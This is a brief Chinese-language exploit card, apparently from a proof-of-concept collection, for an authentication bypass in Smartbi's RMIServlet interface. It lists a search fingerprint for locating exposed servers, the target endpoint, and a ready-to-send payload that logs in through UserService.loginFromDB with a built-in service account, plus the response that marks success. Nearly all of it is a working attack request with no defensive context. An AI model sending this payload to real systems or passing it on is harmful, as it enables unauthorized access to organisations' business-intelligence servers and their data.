# SmartbiRMIServlet接口权限绕过漏洞

SmartbiRMIServlet ｜ 认证/授权绕过 ｜ —
- **指纹**：`body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"`
- **请求**：`POST /smartbi/vision/RMIServlet HTTP/1.1`

**Payload**
```
className=UserService&methodName=loginFromDB&params=["service","0a"]
```
- **响应特征**：200 Set-Cookie